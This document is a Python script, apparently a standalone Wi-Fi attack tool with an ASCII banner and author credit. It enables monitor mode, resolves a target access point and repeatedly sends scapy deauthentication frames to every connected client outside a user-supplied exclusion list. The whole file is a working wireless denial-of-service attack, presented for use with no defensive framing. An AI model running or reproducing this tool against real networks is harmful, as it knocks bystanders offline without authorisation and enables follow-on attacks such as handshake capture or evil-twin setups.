import os
import time
import subprocess
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

def enable_monitor_mode(interface):
    """Enable monitor mode on the specified interface."""
    os.system(f"airmon-ng start {interface}")

def disable_monitor_mode(interface):
    """Disable monitor mode on the specified interface."""
    os.system(f"airmon-ng stop {interface}")

def get_bssid_from_essid(essid, interface):
    """Find the BSSID of a network using its ESSID via airodump-ng."""
    print(f"Scanning for network ESSID: {essid}")
    try:
        os.system(f"airodump-ng -w temp_scan --output-format csv {interface}mon 2>/dev/null")
        with open("temp_scan-01.csv", "r") as f:
            for line in f.readlines():
                fields = line.split(",")
                if len(fields) > 13:
                    bssid = fields[0].strip()
                    detected_essid = fields[13].strip()
                    if detected_essid == essid:
                        print(f"Found BSSID for ESSID '{essid}': {bssid}")
                        return bssid
        print(f"ESSID '{essid}' not found.")
        return None
    finally:
        if os.path.exists("temp_scan-01.csv"):
            os.remove("temp_scan-01.csv")

def deauth(target_mac, ap_mac, interface):
    """Send deauthentication packets."""
    dot11 = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
    deauth = Dot11Deauth(reason=7)
    frame = RadioTap() / dot11 / deauth
    sendp(frame, iface=interface, count=10, inter=0.2, verbose=False)

def scan_for_clients(ap_bssid, interface, exclusions):
    """Continuously scan for connected clients and deauth them."""
    print(f"Scanning for clients connected to AP {ap_bssid}...")
    command = [
        "airodump-ng",
        "--bssid", ap_bssid,
        "-w", "temp_clients",
        "--output-format", "csv",
        interface
    ]
    try:
        process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)

        while True:
            if os.path.exists("temp_clients-01.csv"):
                with open("temp_clients-01.csv", "r") as f:
                    lines = f.readlines()
                    for line in lines:
                        fields = line.split(",")
                        if len(fields) > 0:
                            client_mac = fields[0].strip()
                            if client_mac and client_mac not in exclusions and len(client_mac) == 17:
                                print(f"Deauthenticating client: {client_mac}")
                                deauth(client_mac, ap_bssid, interface)
                time.sleep(5)
    except KeyboardInterrupt:
        print("\nStopping scan and cleanup...")
    finally:
        process.terminate()
        if os.path.exists("temp_clients-01.csv"):
            os.remove("temp_clients-01.csv")

if __name__ == "__main__":
    print(
'''
      _        _         _______  __                       _                        
     / \      (_)       |_   __ \[  |                     / |_                      
    / _ \     __   _ .--. | |__) || |--.   ,--.   _ .--. `| |-' .--.   _ .--..--.   
   / ___ \   [  | [ `/'`\]|  ___/ | .-. | `'_\ : [ `.-. | | | / .'`\ \[ `.-. .-. |  
 _/ /   \ \_  | |  | |   _| |_    | | | | // | |, | | | | | |,| \__. | | | | | | |  
|____| |____|[___][___] |_____|  [___]|__]\\'-;__/[___||__]\__/ '.__.' [___||__||__] 
                                                                                    
Made By:- Harsh Raj Singhania
Email: raj.harshraut@gmail.com
''')
    interface = input("Enter your Wi-Fi interface (e.g., wlan0): ")
    target = input("Enter the AP's ESSID or BSSID to target: ")
    exclusions = input("Enter MAC addresses to exclude (comma-separated): ").split(",")
    exclusions = [mac.strip() for mac in exclusions]

    try:
        enable_monitor_mode(interface)
        interface_mon = f"{interface}mon"

        # Resolve ESSID to BSSID if needed
        if ":" in target:  # Likely a BSSID
            ap_bssid = target
        else:
            ap_bssid = get_bssid_from_essid(target, interface)
            if not ap_bssid:
                print("Failed to find BSSID. Exiting.")
                exit(1)

        scan_for_clients(ap_bssid, interface_mon, exclusions)
    finally:
        disable_monitor_mode(interface_mon)
        print("Monitor mode disabled. Exiting.")


